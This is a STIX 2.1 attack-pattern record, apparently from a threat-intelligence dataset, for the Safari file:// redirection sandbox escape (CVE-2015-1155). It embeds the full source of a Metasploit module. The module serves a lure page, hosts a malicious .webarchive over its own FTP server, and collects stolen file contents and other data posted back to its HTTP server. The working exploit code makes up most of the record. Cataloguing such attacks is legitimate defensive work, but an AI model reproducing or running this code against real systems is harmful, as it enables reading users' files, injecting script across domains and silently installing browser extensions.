{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14942942-d576-4d43-8727-35d967f86b8a",
    "created": "2024-08-14T16:31:34.397847Z",
    "modified": "2024-08-14T16:31:34.397851Z",
    "name": "Mac OS X Safari file:// Redirection Sandbox Escape",
    "description": " Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a \"state management issue\" that allows a browser window to be navigated",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/safari_file_url_navigation.rb",
            "external_id": "safari_file_url_navigation.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1155"
        },
        {
            "source_name": "reference",
            "url": "https://support.apple.com/en-us/HT204826"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::Format::Webarchive\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Mac OS X Safari file:// Redirection Sandbox Escape',\n      'Description' => %q{\n        Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a\n        \"state management issue\" that allows a browser window to be navigated\n        to a file:// URL. By dropping and loading a malicious .webarchive file,\n        an attacker can read arbitrary files, inject cross-domain Javascript, and\n        silently install Safari extensions.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      => [\n        'joev' # discovery, module\n      ],\n      'References'  => [\n        ['ZDI', '15-228'],\n        ['CVE', '2015-1155'],\n        ['URL', 'https://support.apple.com/en-us/HT204826']\n      ],\n      'Platform'    => 'osx',\n      'DisclosureDate' => '2014-01-16'\n    ))\n\n\n    register_options([\n      OptString.new(\"URIPATH\", [false, 'The URI to use for this exploit (default is random)']),\n      OptPort.new('SRVPORT',   [true, \"The local port to use for the FTP server\", 8081]),\n      OptPort.new('HTTPPORT',  [true, \"The HTTP server port\", 8080])\n    ])\n  end\n\n  def lookup_lhost(c=nil)\n    # Get the source address\n    if datastore['SRVHOST'] == '0.0.0.0'\n      Rex::Socket.source_address( c || '50.50.50.50')\n    else\n      datastore['SRVHOST']\n    end\n  end\n\n  def on_request_uri(cli, req)\n    if req.method =~ /post/i\n      data_str = req.body.to_s\n      begin\n        data = JSON::parse(data_str || '')\n        file = record_data(data, cli)\n        send_response(cli, '')\n        print_good \"data #{data.keys.join(',')} received and stored to #{file}\"\n      rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up\n        file = record_data(data_str, cli)\n        print_error \"Invalid JSON stored in #{file}\"\n        send_response(cli, '')\n      end\n    elsif req.uri =~ /#{popup_path}$/\n      send_response(cli, 200, 'OK', popup_html)\n    else\n      send_response(cli, 200, 'OK', exploit_html)\n    end\n  end\n\n  def ftp_user\n    @ftp_user ||= Rex::Text.rand_text_alpha(6)\n  end\n\n  def ftp_pass\n    @ftp_pass ||= Rex::Text.rand_text_alpha(6)\n  end\n\n  def exploit_html\n    %Q|\n      <html><body>\n      <script>\n        window.onclick = function() {\n          window.open(window.location+'/#{popup_path}', 'x', 'width=1,height=1');\n        }\n      </script>\n      The page has moved. <a href='#'>Click here</a> to be redirected.\n      </body></html>\n    |\n  end\n\n  def ftp_url\n    \"ftp://#{ftp_user}:#{ftp_pass}@#{lookup_lhost}:#{datastore['SRVPORT']}\"\n  end\n\n  def popup_html\n    %Q|\n    <script>\n\n      function perform() {\n        if (arguments.length > 0) {\n          var nextArgs = Array.prototype.slice.call(arguments, 1);\n          arguments[0]();\n          setTimeout(function() {\n            perform.apply(null, nextArgs);\n          }, 300);\n        }\n      }\n\n      perform(\n        function() { opener.location = 'http://localhost:99999'; },\n        function() { history.pushState.call(opener.history, {}, {}, 'file:///'); },\n        function() { opener.location = 'about:blank' },\n        function() { opener.history.back(); },\n        function() { window.location = '#{ftp_url}'; },\n        function() { opener.location = 'http://localhost:99998'; },\n        function() {\n          history.pushState.call(\n            opener.history, {}, {},\n            'file:///Volumes/#{lookup_lhost}/#{payload_name}'\n          );\n        },\n        function() { opener.location = 'about:blank'; },\n        function() { opener.history.back(); },\n        function() { if (#{datastore['INSTALL_EXTENSION']}) { opener.postMessage('EXT', '*'); window.location = '#{apple_extension_url}'; } else { window.close(); } }\n      )\n\n     </script>\n    |\n  end\n\n  #\n  # Handle FTP LIST request (send back the directory listing)\n  #\n  def on_client_command_list(c, arg)\n    conn = establish_data_connection(c)\n    if not conn\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status(\"Data connection setup\")\n    c.put(\"150 Here comes the directory listing\\r\\n\")\n\n    print_status(\"Sending directory list via data connection #{webarchive_size}\")\n    month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']\n    m = month_names[Time.now.month-1]\n    d = Time.now.day\n    y = Time.now.year\n\n    dir = \"-rwxr-xr-x 1 ftp ftp              #{webarchive_size} #{m} #{d}  #{y} #{payload_name}\\r\\n\"\n    print_status dir\n    conn.put(dir)\n    conn.close\n\n    print_status(\"Directory sent ok\")\n    c.put(\"226 Transfer ok\\r\\n\")\n\n    return\n  end\n\n  #\n  # Handle the FTP RETR request. This is where we transfer our actual malicious payload\n  #\n  def on_client_command_retr(c, arg)\n    conn = establish_data_connection(c)\n    if not conn\n      return c.put(\"425 can't build data connection\\r\\n\")\n    end\n\n    print_status(\"Connection for file transfer accepted\")\n    c.put(\"150 Connection accepted\\r\\n\")\n\n    # Send out payload\n    conn.put(webarchive)\n    conn.close\n  end\n\n  def volume_name\n    @volume_name ||= Rex::Text.rand_text_alpha(12)\n  end\n\n  def payload_name\n    'msf.webarchive'\n  end\n\n  def popup_path\n    @popup_uri ||= Rex::Text.rand_text_alpha(12)\n  end\n\n  def webarchive\n    webarchive_xml\n  end\n\n  def webarchive_size\n    print_status \"Webarchive_SiZE=#{webarchive_xml.length}\"\n    webarchive_xml.length\n  end\n\n  def run\n    # Start the FTP server\n    print_status(\"Running FTP service...\")\n    start_service\n\n    # Create our own HTTP server\n    # We will stay in this functino until we manually terminate execution\n    start_http\n  end\n\n  #\n  # Handle the HTTP request and return a response.  Code borrorwed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http(opts={})\n    # Ensture all dependencies are present before initializing HTTP\n    use_zlib\n\n    comm = datastore['ListenerComm']\n    if (comm.to_s == \"local\")\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    # Default the server host / port\n    opts = {\n      'ServerHost' => datastore['SRVHOST'],\n      'ServerPort' => datastore['HTTPPORT'],\n      'Comm'       => comm\n    }.update(opts)\n\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      opts['ServerPort'].to_i,\n      opts['ServerHost'],\n      datastore['SSL'],\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self,\n      },\n      opts['Comm'],\n      datastore['SSLCert']\n    )\n\n    @http_service.server_name = datastore['HTTP::server_name']\n\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n\n    proto = (datastore[\"SSL\"] ? \"https\" : \"http\")\n    print_status(\"Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}\")\n\n    if (opts['ServerHost'] == '0.0.0.0')\n      print_status(\" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}\")\n    end\n\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n\n    # As long as we have the http_service object, we will keep the ftp server alive\n    while @http_service\n      select(nil, nil, nil, 1)\n    end\n  end\n\n  #\n  # Ensures that gzip can be used.  If not, an exception is generated.  The\n  # exception is only raised if the DisableGzip advanced option has not been\n  # set.\n  #\n  def use_zlib\n    if !Rex::Text.zlib_present? && datastore['HTTP::compression']\n      fail_with(Failure::Unknown, \"zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!\")\n    end\n  end\n\n  #\n  # Returns the configured (or random, if not configured) URI path\n  #\n  def resource_uri\n    path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))\n    path = '/' + path if path !~ /^\\//\n    datastore['URIPATH'] = path\n    return path\n  end\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message='OK', html='')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res['Content-Type'] = 'text/html'\n    res.body = html\n\n    cli.send_response(res)\n  end\n\n  # @param [Hash] data the data to store in the log\n  # @return [String] filename where we are storing the data\n  def record_data(data, cli)\n    name = if data.is_a?(Hash) then data.keys.first else 'data' end\n    file = File.basename(name).gsub(/[^A-Za-z]/,'')\n    store_loot(\n      file, \"text/plain\", cli.peerhost, data, \"safari_webarchive\", \"Webarchive Collected Data\"\n    )\n  end\n\n  #\n  # Kill HTTP/FTP (shut them down and clear resources)\n  #\n  def cleanup\n    super\n\n    # Kill FTP\n    cleanup_service\n\n    # clear my resource, deregister ref, stop/close the HTTP socket\n    begin\n      @http_service.remove_resource(datastore['URIPATH'])\n      @http_service.deref\n      @http_service = nil\n    rescue\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-01-16",
    "x_mitre_platforms": [
        "osx'"
    ]
}